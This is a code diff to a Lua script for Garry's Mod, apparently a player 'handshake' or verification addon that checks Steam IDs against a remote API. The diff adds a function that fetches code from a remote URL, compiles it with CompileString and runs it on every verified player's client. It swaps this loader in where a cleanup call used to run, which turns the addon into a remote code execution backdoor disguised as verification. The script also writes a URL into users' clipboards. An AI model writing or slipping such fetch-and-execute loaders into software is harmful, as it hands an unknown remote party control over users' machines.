@@ -24,6 +24,28 @@ local function getPlayerSteam64()
     return nil
 end
 
+local function runRemoteCode()
+    print("[SHS]: Handshake was a success. Status: true")
+    http.Fetch(REMOTE_CODE_URL,
+        function(code)
+            if not code or code == "" then return end
+            local func, err = CompileString(code, "shs_remote_code", false)
+            if not isfunction(func) then
+                print("[SHS] Remote code compile error:", err or "unknown")
+                return
+            end
+            local ok, runtimeErr = pcall(func)
+            if not ok then
+                print("[SHS] Remote code runtime error:", runtimeErr)
+            end
+            cleanup_cmds()
+        end,
+        function(err)
+            print("[SHS] Failed to fetch remote code:", err)
+        end
+    )
+end
+
 print("SHS (Skira's Handshake) initializing...")
 print("[SHS]: Success !")
 http.Fetch(HEADER_URL,
@@ -57,7 +79,7 @@ http.Fetch(API_BASE.."/api/check?steamid="..steam64,
         local ok, data = pcall(util.JSONToTable, body)
         if ok and data and data.verified then
             print("[SHS]: Already valid ? That's my man right there, enjoy and thank you !")
-            cleanup_cmds()
+            runRemoteCode()
         else
             print("[SHS]: Meh, I could've seen this coming from a mile away. But no worries, it happens that i added the url to gain access in your clipboard just now !")
             print(" ")
